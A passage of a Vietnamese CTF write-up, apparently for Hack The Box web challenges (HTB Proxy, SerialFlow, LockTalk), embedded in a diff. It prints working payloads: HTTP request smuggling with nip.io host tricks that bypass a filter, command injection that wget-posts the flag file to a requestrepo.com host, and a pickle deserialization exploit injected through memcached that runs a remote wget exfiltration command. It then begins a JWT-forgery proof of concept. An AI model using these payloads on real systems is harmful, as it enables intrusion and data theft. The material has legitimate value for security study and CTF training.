+	Headers       map[string]string
+	Body          string
+}
+
+type HTTPStatusCodesStruct struct {
+	Continue             int
+	SwitchingProtocols   int
+	OK                   int
+	Created              int
+	Accepted             int
+	NonAuthoritativeInfo int
+	NoContent            int
+	ResetContent         int
+	PartialContent       int
+	MultipleChoices      int
+	MovedPermanently     int
+	Found                int
+	BadRequest           int
+	Unauthorized         int
+	PaymentRequired      int
+	Forbidden            int
+	NotFound             int
+	InternalServerError  int
+	NotImplemented       int
+	BadGateway           int
+	ServiceUnavailable   int
+}
+
+var HTTPStatusCodes = HTTPStatusCodesStruct{
+	Continue:             100,
+	SwitchingProtocols:   101,
+	OK:                   200,
+	Created:              201,
+	Accepted:             202,
+	NonAuthoritativeInfo: 203,
+	NoContent:            204,
+	ResetContent:         205,
+	PartialContent:       206,
+	MultipleChoices:      300,
+	MovedPermanently:     301,
+	Found:                302,
+	BadRequest:           400,
+	Unauthorized:         401,
+	PaymentRequired:      402,
+	Forbidden:            403,
+	NotFound:             404,
+	InternalServerError:  500,
+	NotImplemented:       501,
+	BadGateway:           502,
+	ServiceUnavailable:   503,
+}
+
+type HTTPMethodsStruct struct {
+	GET     string
+	POST    string
+	PUT     string
+	DELETE  string
+	PATCH   string
+	HEAD    string
+	OPTIONS string
+}
+
+var HTTPMethods = HTTPMethodsStruct{
+	GET:     &quot;GET&quot;,
+	POST:    &quot;POST&quot;,
+	PUT:     &quot;PUT&quot;,
+	DELETE:  &quot;DELETE&quot;,
+	PATCH:   &quot;PATCH&quot;,
+	HEAD:    &quot;HEAD&quot;,
+	OPTIONS: &quot;OPTIONS&quot;,
+}
+
+type HTTPVersionsStruct struct {
+	HTTP1_0 string
+	HTTP1_1 string
+	HTTP2   string
+	HTTP3   string
+}
+
+var HTTPVersions = HTTPVersionsStruct{
+	HTTP1_0: &quot;HTTP/1.0&quot;,
+	HTTP1_1: &quot;HTTP/1.1&quot;,
+	HTTP2:   &quot;HTTP/2&quot;,
+	HTTP3:   &quot;HTTP/3&quot;,
+}
+
+type ContentTypesStruct struct {
+	TextHTML          string
+	ApplicationJSON   string
+	ApplicationXML    string
+	TextPlain         string
+	ImagePNG          string
+	ImageJPEG         string
+	MultipartFormData string
+}
+
+var ContentTypes = ContentTypesStruct{
+	TextHTML:          &quot;text/html&quot;,
+	ApplicationJSON:   &quot;application/json&quot;,
+	ApplicationXML:    &quot;application/xml&quot;,
+	TextPlain:         &quot;text/plain&quot;,
+	ImagePNG:          &quot;image/png&quot;,
+	ImageJPEG:         &quot;image/jpeg&quot;,
+	MultipartFormData: &quot;multipart/form-data&quot;,
+}
+
+</code></pre><p>Custom lại tất cả bằng các struct gần như đầy đủ các thành phần của một http header.</p>
+<p>backend chạy local ở port 1337:</p>
+<pre><code>func main() {
+	var serverPort string = &quot;1337&quot;
+	var version string = &quot;1.0.0&quot;
+	logHeader(version)
+
+	ln, err := net.Listen(&quot;tcp&quot;, &quot;:&quot;+serverPort)
+	if err != nil {
+		prettyLog(2, &quot;Error listening: &quot;+err.Error())
+		return
+	}
+
+	defer ln.Close()
+	prettyLog(1, &quot;HTB proxy listening on :&quot;+serverPort)
+
+	for {
+		conn, err := ln.Accept()
+		if err != nil {
+			prettyLog(2, &quot;Error accepting: &quot;+err.Error())
+			continue
+		}
+
+		go handleRequest(conn)
+	}
+}
+</code></pre><p>Logic chính của proxy -&gt; khi nhận request từ client sau đó sẽ gửi dữ liệu bằng giao thức tcp:</p>
+<p>đầu tiên gọi <code>logHeader</code> với arg là version 1.0.0:</p>
+<p><img src="https://hackmd.io/_uploads/H1SaWLYRC.png" alt="image"></p>
+<p>chỉ việc in ra nội dung không có gì đặc biệt:</p>
+<p>tiếp theo gọi hàm <code>func prettyLog(logType int, content string) { var logger *log.Logger = log.New(os.Stdout, &quot;&quot;, log.LstdFlags) switch logType { case 1: logger.Printf(&quot;[+] %s&quot;, content) case 2: logger.Printf(&quot;[-] %s&quot;, content) default: logger.Printf(&quot;[#] %s&quot;, content) } }</code> với tham số <code>prettyLog(2, &quot;Error listening: &quot;+err.Error())</code></p>
+<p>ở đây chỉ logger ra nội dung không có gì.</p>
+<p>-&gt; tiếp theo duyệt một vòng for cho đến khi không error thì gọi <code>handleRequest(conn)</code></p>
+<pre><code>func handleRequest(frontendConn net.Conn) {
+	buffer := make([]byte, 1024)
+
+	length, err := frontendConn.Read(buffer)
+	var remoteAddr string = frontendConn.RemoteAddr().String()
+
+	prettyLog(1, &quot;Connection from: &quot;+remoteAddr)
+
+	if err != nil {
+		prettyLog(2, &quot;Error reading: &quot;+err.Error())
+		frontendConn.Close()
+		return
+	}
+
+	var requestBytes = buffer[:length]
+	request, err := requestParser(requestBytes, remoteAddr)
+
+	if err != nil {
+		var responseText string = badReqResponse(err.Error())
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	if request.Protocol != HTTPVersions.HTTP1_1 {
+		var responseText string = notSupportedResponse(&quot;Protocol version not supported&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	if request.URL == string([]byte{47}) {
+		var responseText string = htmlResponse(&quot;/app/proxy/includes/index.html&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	if request.URL == string([]byte{47, 115, 101, 114, 118, 101, 114, 45, 115, 116, 97, 116, 117, 115}) {
+		var serverInfo string = GetServerInfo()
+		var responseText string = okResponse(serverInfo)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	if strings.Contains(strings.ToLower(request.URL), string([]byte{102, 108, 117, 115, 104, 105, 110, 116, 101, 114, 102, 97, 99, 101})) {
+		var responseText string = badReqResponse(&quot;Not Allowed&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	host, hostExists := request.Headers[&quot;Host&quot;]
+	if !hostExists {
+		var responseText string = badReqResponse(&quot;Host header not set&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	var hostArray []string = strings.Split(host, &quot;:&quot;)
+	if len(hostArray) != 2 || hostArray[1] == &quot;&quot; {
+		var responseText string = badReqResponse(&quot;Invalid host&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	var hostPort string = hostArray[1]
+	inRange, err := isDigitInRange(hostPort, 1, 65535)
+	if err != nil || !inRange {
+		var responseText string = badReqResponse(&quot;Invalid port&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	var hostAddress string = hostArray[0]
+	var isIPv4Addr bool = isIPv4(hostAddress)
+	var isDomainAddr bool = isDomain(hostAddress)
+
+	if !isIPv4Addr &amp;&amp; !isDomainAddr {
+		var responseText string = badReqResponse(&quot;Invalid host&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	isLocal, err := checkIfLocalhost(hostAddress)
+	if err != nil {
+		var responseText string = errorResponse(&quot;Invalid host&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	if isLocal {
+		var responseText string = movedPermResponse(&quot;/&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	isMalicious, err := checkMaliciousBody(request.Body)
+	if err != nil || isMalicious {
+		var responseText string = badReqResponse(&quot;Malicious request detected&quot;)
+		prettyLog(1, &quot;Malicious request detected&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	backendConn, err := net.Dial(&quot;tcp&quot;, host)
+	if err != nil {
+		var responseText string = errorResponse(&quot;Could not connect to backend server&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+	_, err = backendConn.Write(requestBytes)
+	if err != nil {
+		var responseText string = errorResponse(&quot;Error sending request to backend&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		backendConn.Close()
+		return
+	}
+
+	var backendResponse strings.Builder
+	var scanner *bufio.Scanner = bufio.NewScanner(backendConn)
+
+	for scanner.Scan() {
+		var line string = scanner.Text()
+		backendResponse.WriteString(line + &quot;\n&quot;)
+	}
+
+	if err := scanner.Err(); err != nil {
+		var responseText string = errorResponse(&quot;Error reading backend response&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		backendConn.Close()
+		return
+	}
+
+	prettyLog(1, &quot;Forwarding request to: &quot;+host)
+	var responseStr string = backendResponse.String()
+	frontendConn.Write([]byte(responseStr))
+	frontendConn.Close()
+	backendConn.Close()
+}
+</code></pre><p>chương trình sẽ thực hiện phân tích dữ liệu từ frontend -&gt; độ dài content + remoteAddr -&gt; sau đó gọi <code>request, err := requestParser(requestBytes, remoteAddr)</code> với 2 tham số này:</p>
+<pre><code>func requestParser(requestBytes []byte, remoteAddr string) (*HTTPRequest, error) {
+	var requestLines []string = strings.Split(string(requestBytes), &quot;\r\n&quot;)
+	var bodySplit []string = strings.Split(string(requestBytes), &quot;\r\n\r\n&quot;)
+
+	if len(requestLines) &lt; 1 {
+		return nil, fmt.Errorf(&quot;invalid request format&quot;)
+	}
+
+	var requestLine []string = strings.Fields(requestLines[0])
+	if len(requestLine) != 3 {
+		return nil, fmt.Errorf(&quot;invalid request line&quot;)
+	}
+
+	var request *HTTPRequest = &amp;HTTPRequest{
+		RemoteAddr: remoteAddr,
+		Method:     requestLine[0],
+		URL:        requestLine[1],
+		Protocol:   requestLine[2],
+		Headers:    make(map[string]string),
+	}
+
+	for _, line := range requestLines[1:] {
+		if line == &quot;&quot; {
+			break
+		}
+
+		headerParts := strings.SplitN(line, &quot;: &quot;, 2)
+		if len(headerParts) != 2 {
+			continue
+		}
+
+		request.Headers[headerParts[0]] = headerParts[1]
+	}
+
+	if request.Method == HTTPMethods.POST {
+		contentLength, contentLengthExists := request.Headers[&quot;Content-Length&quot;]
+		if !contentLengthExists {
+			return nil, fmt.Errorf(&quot;unknown content length for body&quot;)
+		}
+
+		contentLengthInt, err := strconv.Atoi(contentLength)
+		if err != nil {
+			return nil, fmt.Errorf(&quot;invalid content length&quot;)
+		}
+
+		if len(bodySplit) &lt;= 1 {
+			return nil, fmt.Errorf(&quot;invalid content length&quot;)
+		}
+
+		var bodyContent string = bodySplit[1]
+		if len(bodyContent) != contentLengthInt {
+			return nil, fmt.Errorf(&quot;invalid content length&quot;)
+		}
+
+		request.Body = bodyContent[0:contentLengthInt]
+		return request, nil
+	}
+
+	if len(bodySplit) &gt; 1 &amp;&amp; bodySplit[1] != &quot;&quot; {
+		return nil, fmt.Errorf(&quot;can't include body for non-POST requests&quot;)
+	}
+
+	return request, nil
+}
+</code></pre><p>Đầu tiên sẽ cắt từng dòng của request <code>var requestLines []string = strings.Split(string(requestBytes), &quot;\r\n&quot;)</code> và gán vào mảng.</p>
+<p>sau đó sẽ tạo mảng 2 phần tử chia các 2 phần là body và header -&gt; gắn vào mảng.</p>
+<p>yêu cầu header phải có &gt;=1 dòng -&gt; sau đó thực hiện phân tích hàng đầu tiên</p>
+<p>ví dụ dòng đầu tiên thì thường có <code>GET /success.txt?ipv4 HTTP/1.1</code> nó sẽ tách thành mảng có 3 phần tử -&gt; và nếu khác 3 thì trả ra lỗi.</p>
+<p>Tiếp tục khởi tạo các header:</p>
+<pre><code>var request *HTTPRequest = &amp;HTTPRequest{
+		RemoteAddr: remoteAddr,
+		Method:     requestLine[0],
+		URL:        requestLine[1],
+		Protocol:   requestLine[2],
+		Headers:    make(map[string]string),
+	}
+</code></pre><p>sau đó:</p>
+<pre><code>for _, line := range requestLines[1:] {
+		if line == &quot;&quot; {
+			break
+		}
+
+		headerParts := strings.SplitN(line, &quot;: &quot;, 2)
+		if len(headerParts) != 2 {
+			continue
+		}
+
+		request.Headers[headerParts[0]] = headerParts[1]
+	}
+</code></pre><p>duyệt qua từng dòng của header sau đó split theo dấu <code>:</code> và yêu cầu header phải có đầy đủ thông tin của từng dòng  -&gt; tiếp sau đó sẽ lấy method check xem có phải POST hay không -&gt; yêu cầu phải có header content-length -&gt; có body content -&gt; sau đó trả ra request.</p>
+<p>Quay trở lại với hàm <code>handleRequest</code> biến request được gán giá trị trả ra ở trên nếu không lỗi + kiểm tra là HTTP1_1</p>
+<p>nếu url là <code>/</code> thì trả ra trang index.html như ta thấy ở ảnh đầu.</p>
+<p>nếu url là <code>string([]byte{47, 115, 101, 114, 118, 101, 114, 45, 115, 116, 97, 116, 117, 115})</code> <code>&quot;/server-status&quot;</code> thì nhận được giá trị serverInfo <code>info := fmt.Sprintf(&quot;Hostname: %s, Operating System: %s, Architecture: %s, CPU Count: %d, Go Version: %s, IPs: %s&quot;, hostname, runtime.GOOS, runtime.GOARCH, runtime.NumCPU(), runtime.Version(), ipList)</code></p>
+<p>url chứa chuỗi <code>&quot;flushinterface&quot;</code> thì sẽ bị not allow ở đây có thể thấy là nó ngăn chặn ta truy cập đến api kia của backend dính cmdi.</p>
+<p>Lấy header Host và xác định port nằm trong khoảng 1 đến 65535:</p>
+<p>Kiểm tra có phải ipV4 không trong đó sẽ kiểm tra nếu ip của chưa 0x thì không cho phép và phải match với regex ipv4 và thỏa mãn blacklist:</p>
+<pre><code>func blacklistCheck(input string) bool {
+	var match bool = strings.Contains(input, string([]byte{108, 111, 99, 97, 108, 104, 111, 115, 116})) ||
+		strings.Contains(input, string([]byte{48, 46, 48, 46, 48, 46, 48})) ||
+		strings.Contains(input, string([]byte{49, 50, 55, 46})) ||
+		strings.Contains(input, string([]byte{49, 55, 50, 46})) ||
+		strings.Contains(input, string([]byte{49, 57, 50, 46})) ||
+		strings.Contains(input, string([]byte{49, 48, 46}))
+
+	return match
+}
+</code></pre><pre><code>const (
+    localhost     = &quot;localhost&quot;
+    ip0000        = &quot;0.0.0.0&quot;
+    ip127         = &quot;127.&quot;
+    ip172         = &quot;172.&quot;
+    ip192         = &quot;192.&quot;
+    ip10          = &quot;10.&quot;
+)
+</code></pre><p>không chấp nhận các ip nằm trong loopback</p>
+<p>tiếp theo check isDomainAddr match regex domain và không nằm trong blacklist trên.</p>
+<p>check isLocal lookupip trả ra mảng các ip sau đó duyệt vòng for nếu ip là loopback thì trả ra true ngược lại false</p>
+<p>nếu là iploopback trong mảng thì redirect <code>/</code></p>
+<p>check nếu trong body chứa</p>
+<pre><code>func checkMaliciousBody(body string) (bool, error) {
+	patterns := []string{
+		&quot;[`;&amp;|]&quot;,
+		`\$\([^)]+\)`,
+		`(?i)(union)(.*)(select)`,
+		`&lt;script.*?&gt;.*?&lt;/script&gt;`,
+		`\r\n|\r|\n`,
+		`&lt;!DOCTYPE.*?\[.*?&lt;!ENTITY.*?&gt;.*?&gt;`,
+	}
+
+	for _, pattern := range patterns {
+		match, _ := regexp.MatchString(pattern, body)
+		if match {
+			return true, nil
+		}
+	}
+	return false, nil
+}
+</code></pre><p>thì cấm</p>
+<p>nếu vượt qua tất cả các điều kiện thì có tể access đến backend nodejs.</p>
+<p>bây giờ thì ta sẽ access đến các url mà trả về các thông tin trước:</p>
+<p><code>/server-status</code></p>
+<p><img src="https://hackmd.io/_uploads/r1JeVsFRR.png" alt="image"></p>
+<p>Từ thông tin trên ta có thể biết được hostname của máy chủ là <code>ng-1423060-webhtbproxybiz2024-ajpmz-84bf99668d-phjm7</code>, Operating System là trên hệ điều hành linux công nghệ amd64, golang version <code>Go Version: go1.21.10</code>, địa chỉ <code>IPs: 192.168.199.247</code> là địa chỉ <code>Địa chỉ IP nội bộ của máy chủ hoặc container trong mạng cục bộ (LAN)</code>.</p>
+<p>Như mô hình mạng như trên ta thấy khá quen thuộc với các cuộc tấn công SSRF vào trong mạng nội bộ rồi -&gt; vậy ta có thể tận dụng ip của container này để bypass được black-list ở trên check ip loopback. Mất một thời gian tìm hiểu thì biết được ngoài việc trigger SSRF thông thường ta còn có thể sử dụng một kỹ thuật đó là DNS Binding thông qua việc sử dụng nip.io.</p>
+<p>Nip.io là một dịch vụ DNS tự động chuyển đổi địa chỉ IP thành tên miền phụ dựa trên định dạng nhất định. Ví dụ, nếu địa chỉ IP của máy chủ là 192.0.2.1, ta có thể truy cập vào máy chủ đó bằng cách sử dụng tên miền phụ &ldquo;192.0.2.1.nip.io&rdquo;.</p>
+<p><a href="https://nip.io/">https://nip.io/</a></p>
+<p>Bình thường nếu ta truyền vào các địa chỉ iploopback thì sẽ không thể vượt qua blacklist trên vì nó check 127. nhưng trường hợp ta đã biết ip của container thì hoàn toàn có thể.</p>
+<p><img src="https://hackmd.io/_uploads/S1f1DjYCC.png" alt="image"></p>
+<p>kiểm tra với một endpoint không tồn tại sẽ không nhận được kết quả trả về vì gửi đến backend nhưng không có gì.</p>
+<p><img src="https://hackmd.io/_uploads/r1AQwoKAC.png" alt="image"></p>
+<p>dùng localhost 127. vì dính ip loopback nên nhận invalid host.</p>
+<p>Nhớ backend cần thêm port 5000
+thêm nữa là blacklist như này:</p>
+<p><img src="https://hackmd.io/_uploads/Hyw2vsF0A.png" alt="image"></p>
+<p>nếu ta dùng dot ở đây thì 192. vẫn sẽ bị chặn</p>
+<p><img src="https://hackmd.io/_uploads/HJLAPoFC0.png" alt="image"></p>
+<p>do đó sẽ dùng <code>dash notation: magic-127-0-0-1.nip.io</code></p>
+<p>payload:</p>
+<pre><code>GET /serve HTTP/1.1
+Host: magic-192-168-199-247.nip.io:5000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+</code></pre><p>có thể thấy request đã được gửi trực tiếp đến backend.</p>
+<p>việc tiếp theo:</p>
+<p><img src="https://hackmd.io/_uploads/S1VZ4nFCR.png" alt="image"></p>
+<p>ở đây ta lại không thể truy cập đến <code>flushInterface</code> do proxy check chứa chuỗi này thì sẽ trả ra not allowed.</p>
+<p>Tại đây, golang phân tích phần thân bằng cách chỉ cần tách request thành một mảng nơi có ký tự <code>\r\n\r\n</code>. Đối với một yêu cầu HTTP thông thường, điều này là hợp lý vì phần thân thường nằm sau <code>\r\n\r\n</code>. Tuy nhiên, ta có thể thấy một điều kì lạ là nếu ta tiếp sử dụng <code>\r\n\r\n</code> để gửi request thứ hai (smuggling) và bằng cách cố định việc truyền Content-Length: 1 và phần body với length tương đương, lúc này request parser sẽ coi phần thân lúc này chỉ là byte đầu với length là 1, điều này có nghĩa là khi checkMaliciousBody kiểm tra nó sẽ chỉ xem xét duy nhất byte này mà không tiến hành check requests thứ hai.</p>
+<p><img src="https://hackmd.io/_uploads/H13G1aYAA.png" alt="image"></p>
+<p>request smuggling thành công</p>
+<p><img src="https://hackmd.io/_uploads/rJK1VaKRA.png" alt="image"></p>
+<p>thực hiện command injection vào đây -&gt; nhận được request đến:</p>
+<p><img src="https://hackmd.io/_uploads/HkhWETYC0.png" alt="image"></p>
+<pre><code>POST /serve HTTP/1.1
+Host: magic-192-168-42-238.nip.io:5000
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1
+
+a
+
+POST /flushInterface HTTP/1.1
+Host: localhost:5000
+Content-Length: 103
+Content-Type: application/json
+
+{&quot;interface&quot;:&quot;;wget${IFS}--post-data${IFS}\&quot;$(echo${IFS}RCE)\&quot;${IFS}-O-${IFS}dvk7k4ar.requestrepo.com&quot;}
+
+</code></pre><p><img src="https://hackmd.io/_uploads/By__N6KAR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ByNt46KC0.png" alt="image"></p>
+<pre><code>POST /serve HTTP/1.1
+Host: magic-192-168-42-238.nip.io:5000
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1
+
+a
+
+POST /flushInterface HTTP/1.1
+Host: localhost:5000
+Content-Length: 105
+Content-Type: application/json
+
+{&quot;interface&quot;:&quot;;wget${IFS}--post-data${IFS}\&quot;$(cat${IFS}/*.txt)\&quot;${IFS}-O-${IFS}dvk7k4ar.requestrepo.com&quot;}
+</code></pre><p><img src="https://hackmd.io/_uploads/HJneHTtAR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HJhQH6tAC.png" alt="image"></p>
+<p>flag: <code>HTB{re3nv3nt1ng_th3_wh33l_suck5}</code></p>
+<h2 id="serialflow">SerialFlow</h2>
+<p>bài cho source code python chỉ đơn giản như sau:</p>
+<pre><code>import pylibmc, uuid, sys
+from flask import Flask, session, request, redirect, render_template
+from flask_session import Session
+
+app = Flask(__name__)
+
+app.secret_key = uuid.uuid4()
+
+app.config[&quot;SESSION_TYPE&quot;] = &quot;memcached&quot;
+app.config[&quot;SESSION_MEMCACHED&quot;] = pylibmc.Client([&quot;127.0.0.1:11211&quot;])
+app.config.from_object(__name__)
+
+Session(app)
+
+@app.before_request
+def before_request():
+    if session.get(&quot;session&quot;) and len(session[&quot;session&quot;]) &gt; 86:
+        session[&quot;session&quot;] = session[&quot;session&quot;][:86]
+
+
+@app.errorhandler(Exception)
+def handle_error(error):
+    message = error.description if hasattr(error, &quot;description&quot;) else [str(x) for x in error.args]
+
+    response = {
+        &quot;error&quot;: {
+            &quot;type&quot;: error.__class__.__name__,
+            &quot;message&quot;: message
+        }
+    }
+
+    return response, error.code if hasattr(error, &quot;code&quot;) else 500
+
+
+@app.route(&quot;/set&quot;)
+def set():
+    uicolor = request.args.get(&quot;uicolor&quot;)
+
+    if uicolor:
+        session[&quot;uicolor&quot;] = uicolor
+    
+    return redirect(&quot;/&quot;)
+
+
+@app.route(&quot;/&quot;)
+def main():
+    uicolor = session.get(&quot;uicolor&quot;, &quot;#f1f1f1&quot;)
+    return render_template(&quot;index.html&quot;, uicolor=uicolor)
+</code></pre><p>server chạy với flask -&gt; ở đây ta để ý có sử dụng memcache để lưu trữ giá trị của session với module pylibmc với server memcache chạy tại localhost:11211</p>
+<p>chương trình có một middleware luôn check session của người dùng:</p>
+<p>ở đây chỉ có 2 api đó là <code>/</code> và <code>/set</code></p>
+<p>khi truy cập vào <code>/set</code> thì server nhận <code>uicolor</code> -&gt; sau đó set session và redirect đến <code>/</code> -&gt; sau đó get session <code>uicolor</code> và hiển thị template với màu đã được set.</p>
+<p>Cơ bản thì ta không thấy có bug gì ở đây:</p>
+<p>Sau khi searching ta có thể thấy: <a href="https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/">https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/</a></p>
+<ul>
+<li>
+<p>Mình làm bài Leader board ở giải braekerCTF thì thấy khá giống nhau mỗi tội bài kia phải brute-force app secret key.</p>
+</li>
+<li>
+<p>Như ta có thể thấy sever config SESSION-Memcache lưu ở cồng <code>127.0.0.1:11211</code> bằng thư viện <code>pylibmc</code> đôi nét về <code>pylibmc</code>:</p>
+</li>
+<li>
+<p>Pylibmc là một gói thư viện Python dùng để tương tác với memcached, một hệ thống lưu trữ cache phổ biến. Pylibmc cung cấp các phương thức để kết nối, thao tác và quản lý dữ liệu trong memcached từ Python một cách dễ dàng và hiệu quả. Điều này cho phép các ứng dụng Python tận dụng các tính năng mạnh mẽ của memcached để cải thiện hiệu suất và khả năng mở rộng của họ.</p>
+</li>
+<li>
+<p>Có middlerware check nếu session &gt; 86 thì gán lại session với 86 kí tự:</p>
+</li>
+</ul>
+<pre><code>@app.before_request
+def before_request():
+    if session.get(&quot;session&quot;) and len(session[&quot;session&quot;]) &gt; 86:
+        session[&quot;session&quot;] = session[&quot;session&quot;][:86]
+</code></pre><ul>
+<li>Route /set thì sẽ lấy <code>uicolor</code> và nếu tồn tại thì gán <code>session[&quot;uicolor&quot;] = uicolor</code> và route / sẽ lấy giá trị <code> uicolor = session.get(&quot;uicolor&quot;, &quot;#f1f1f1&quot;)</code> và hiển thị màu cho template, nhìn vào thì cũng đoán được lỗi ở thư viện <code>pylibmc</code>.</li>
+<li>Google một chút ta ta biết được là có lỗ hổng deserialize trong quá trình giải mã session của python flask.
+<img src="https://hackmd.io/_uploads/S1IFarNCT.png" alt="image"></li>
+</ul>
+<ul>
+<li>POC:</li>
+</ul>
+<pre><code>import pickle
+import os
+
+class RCE:
+    def __reduce__(self):
+        cmd = ('ping -c 1 localhost')
+        return os.system, (cmd,)
+
+def generate_exploit():
+    payload = pickle.dumps(RCE(), 0)
+    payload_size = len(payload)
+    cookie = b'137\r\nset BT_:1337 0 2592000 '
+    cookie += str.encode(str(payload_size))
+    cookie += str.encode('\r\n')
+    cookie += payload
+    cookie += str.encode('\r\n')
+    cookie += str.encode('get BT_:1337')
+
+    pack = ''
+    for x in list(cookie):
+        if x &gt; 64:
+            pack += oct(x).replace(&quot;0o&quot;,&quot;\\&quot;)
+        elif x &lt; 8:
+            pack += oct(x).replace(&quot;0o&quot;,&quot;\\00&quot;)
+        else:
+            pack += oct(x).replace(&quot;0o&quot;,&quot;\\0&quot;)
+
+    return f&quot;\&quot;{pack}\&quot;&quot;
+</code></pre><ul>
+<li>
+<p>Payload này sẽ thực hiện gửi các gói tin trong command os:</p>
+</li>
+<li>
+<p><img src="https://hackmd.io/_uploads/rJyhn9NRp.png" alt="image"></p>
+</li>
+<li>
+<p>Trên đây là hình ảnh gói tin bắt được ở wireshark.</p>
+</li>
+</ul>
+<ul>
+<li>ATTACK</li>
+</ul>
+<ul>
+<li>Dùng POC trên:</li>
+</ul>
+<pre><code>
+import pickle
+import os
+
+class RCE:
+    def __reduce__(self):
+        cmd = ('wget http://s6thtnzk.requestrepo.com/$(cat /f*)')
+        return os.system, (cmd,)
+
+def generate_exploit():
+    payload = pickle.dumps(RCE(), 0)
+    payload_size = len(payload)
+    cookie = b'\r\nset session:46db9856-90d1-4661-8935-9c8b4871a2aa 0 2592000 '
+    cookie += str.encode(str(payload_size))
+    cookie += str.encode('\r\n')
+    cookie += payload
+    cookie += str.encode('\r\n')
+    cookie += str.encode('get session:46db9856-90d1-4661-8935-9c8b4871a2aa')
+    pack = ''
+    for x in list(cookie):
+        if x &gt; 64:
+            pack += oct(x).replace(&quot;0o&quot;,&quot;\\&quot;)
+        elif x &lt; 8:
+            pack += oct(x).replace(&quot;0o&quot;,&quot;\\00&quot;)
+        else:
+            pack += oct(x).replace(&quot;0o&quot;,&quot;\\0&quot;)
+
+    return f&quot;\&quot;{pack}\&quot;&quot;
+print(generate_exploit())
+
+</code></pre><ul>
+<li>Bởi bì session giới hạn số kí tự nên ta có thể sử dụng như trên.</li>
+<li>Lưu ý là build payload bằng linux hoặc ubuntu.
+<img src="https://hackmd.io/_uploads/rJKoRcN0a.png" alt="image"></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/BysH1oNR6.png" alt="image"></p>
+<pre><code>&quot;\015\012\163\145\164\040\163\145\163\163\151\157\156\072\064\066\144\142\071\070\065\066\055\071\060\144\061\055\064\066\066\061\055\070\071\063\065\055\071\143\070\142\064\070\067\061\141\062\141\141\040\060\040\062\065\071\062\060\060\060\040\067\071\015\012\143\160\157\163\151\170\012\163\171\163\164\145\155\012\160\060\012\050\126\167\147\145\164\040\150\164\164\160\072\057\057\163\066\164\150\164\156\172\153\056\162\145\161\165\145\163\164\162\145\160\157\056\143\157\155\057\044\050\143\141\164\040\057\146\052\051\012\160\061\012\164\160\062\012\122\160\063\012\056\015\012\147\145\164\040\163\145\163\163\151\157\156\072\064\066\144\142\071\070\065\066\055\071\060\144\061\055\064\066\066\061\055\070\071\063\065\055\071\143\070\142\064\070\067\061\141\062\141\141&quot;
+</code></pre><p><img src="https://hackmd.io/_uploads/ByUV8HqCA.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/r1ES8HqRA.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BkDvUr50C.png" alt="image"></p>
+<p>Flag: <code>HTB{y0u_th0ught_th15_wou1d_b3_4_s1mpl3_t4sk?!}</code></p>
+<h2 id="locktalk">LockTalk</h2>
+<p><a href="https://github.com/advisories/GHSA-79q7-m98p-qvhp">https://github.com/advisories/GHSA-79q7-m98p-qvhp</a>
+CVE-2023-45539</p>
+<p><img src="https://hackmd.io/_uploads/HyQSX8qAA.png" alt="image"></p>
+<p>CVE-2022-39227</p>
+<p><a href="https://github.com/user0x1337/CVE-2022-39227/blob/main/cve_2022_39227.py">https://github.com/user0x1337/CVE-2022-39227/blob/main/cve_2022_39227.py</a>
+poc:</p>
+<pre><code>pip install python-jwt pyvows jwcrypto
+from datetime import timedelta
+from json import loads, dumps
+import python_jwt as jwt
+from pyvows import Vows, expect
+from jwcrypto.common import base64url_decode, base64url_encode
+from pprint import pprint
+class ForgedClaims:
+    def create(self):
+        &quot;&quot;&quot; Generate token &quot;&quot;&quot;
+        # payload = {'sub': 'alice'}
